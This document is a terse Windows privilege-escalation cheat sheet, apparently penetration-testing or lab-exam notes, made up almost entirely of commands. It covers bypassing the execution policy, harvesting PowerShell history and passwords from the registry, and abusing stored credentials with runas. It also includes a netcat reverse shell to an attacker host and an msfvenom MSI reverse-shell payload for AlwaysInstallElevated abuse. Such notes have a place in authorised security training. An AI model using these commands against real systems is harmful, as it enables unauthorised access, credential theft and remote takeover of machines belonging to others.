# Quick Wins

## Run Powershell

```powershell
powershell -ep bypass
```

## PowerShell History

```powershell
# GET THE PATH TO THE LOG FILE
(Get-PSReadlineOption).HistorySavePath

# DEFAULT PATH
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# USER PATH
C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

## User Enumeration

```powershell
whoami
whoami /priv
whoami /groups
whoami /all
net user
net user bob
net user administrator
```

## OS Enumeration

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
hostname
```

## Hot Fixes

```powershell
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

## Open Ports

```powershell
netstat -ano   # Compare internal/external ports open
netstat -ano | findstr "127.0.0.1"  # Get only local ports open

# FOUND INTERESTING LOCAL PORT? FORWARD IT! (nickel machine)
ssh -N -L 0.0.0.0:1337:127.0.0.1:14147 ariah@192.168.245.99
```

## Check Firewall

```powershell
netsh firewall show state        # Is it enabled?
netsh firewall show config       # Check the ports/rules
```

## Find Passwords

### In the registry

```powershell
reg query HKLM /f password /t REG_SZ /s    # Maybe try 'pass' instead of 'password'
reg query HKCU /f password /t REG_SZ /s    # Maybe try 'pass' instead of 'password'
```

### Autologin

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

## RunAS

```powershell
cmdkey /list    # If return "User: HOSTNAME/Administrator" we can run cmds as Administrator using stored creds

# Example
c:/Windows/System32/runas.exe /user:HOSTNAME\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\proof.txt > C:\Users\lowprivuser\proof.txt"

# Reverse Shell
c:\Windows\System32\runas.exe /user: ACCESS\Administrator /savecred "nc.exe -e cmd.exe 192.168.x.x 4444"
```

## AlwaysElevated

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated      # Should return 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated      # Should return 0x1
msvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=4444 -f msi -o setup.msi   # Create a rev shell (kali)
msiexec /i "C:\Windows\Temp\shell.msi"  # Install/run the rev shell (win)
```